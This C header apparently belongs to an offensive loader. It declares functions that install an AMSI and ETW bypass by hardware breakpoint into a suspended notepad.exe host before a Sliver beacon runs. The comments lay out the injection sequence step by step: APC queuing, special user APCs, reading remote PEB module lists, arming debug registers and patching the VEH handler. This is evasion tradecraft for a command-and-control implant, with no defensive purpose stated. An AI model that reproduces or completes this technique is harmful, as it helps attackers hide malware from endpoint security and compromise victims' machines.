/*
 * remote_hwbp.h — Port HWBP AMSI/ETW bypass into a remote process.
 */

#ifndef REMOTE_HWBP_H
#define REMOTE_HWBP_H

#include <windows.h>

/*
 * Stage an AMSI + ETW hardware-breakpoint bypass into a suspended
 * remote process (notepad.exe host) prior to ResumeThread.
 *
 *   hProcess, hThread — handles from CreateProcess(SUSPENDED).
 *   bootstrap_entry_out — on success, filled with the remote address of
 *                         the bootstrap routine (caller queues this as
 *                         the FIRST APC before the Sliver APC).
 *
 * Side effects on success:
 *   - A small bootstrap+VEH blob is written into the remote process at
 *     a fresh RX region.
 *   - DR0/DR1 are armed on hThread via NtSetContextThread so the HWBPs
 *     fire inside the remote process when AmsiScanBuffer / EtwEventWrite
 *     are entered.
 *
 * Returns TRUE on success, FALSE if any step failed. On failure the
 * caller may proceed without remote bypass — injection correctness is
 * not dependent on this primitive.
 */
BOOL remote_hwbp_install(HANDLE hProcess, HANDLE hThread,
                         PVOID *bootstrap_entry_out);

/*
 * Third-APC + re-arm: the second half of the remote HWBP primitive.
 *
 * At this point the loader has already queued two APCs on hThread
 * (bootstrap → Sliver) and resumed the thread. The beacon is live but
 * amsi.dll isn't loaded in the host and DR0 is unarmed.
 *
 *   1. Stage an "amsi.dll\0" buffer into the remote process.
 *   2. NtQueueApcThreadEx with the SpecialUserAPC flag (0x1) so the APC
 *      fires even when the thread is deep inside Sliver (non-alertable).
 *      The APC routine is LoadLibraryA; its arg1 is the staged string.
 *   3. Poll the remote PEB_LDR_DATA (InLoadOrderModuleList) via
 *      NtReadVirtualMemory until amsi.dll shows up — short settle (~5s).
 *   4. Compute the remote AmsiScanBuffer VA using the AmsiScanBuffer RVA
 *      from THIS process's amsi.dll (same section-shared image).
 *   5. Patch the VEH's amsi_slot in the remote blob so the handler's
 *      RIP compare fires on the right address.
 *   6. NtSuspendThread → NtGetContextThread → arm DR0 →
 *      NtSetContextThread → NtResumeThread.
 *
 * `blob_remote_base` is the remote address returned by
 * remote_hwbp_install() as `bootstrap_entry_out` (the blob's offset-0,
 * which is also the bootstrap APC entry).
 *
 * Returns TRUE on full success. Any failure is survivable — the beacon
 * stays alive, only in-beacon AMSI is not silenced.
 */
BOOL remote_hwbp_finish_amsi(HANDLE hProcess, HANDLE hThread,
                             PVOID blob_remote_base);

#endif
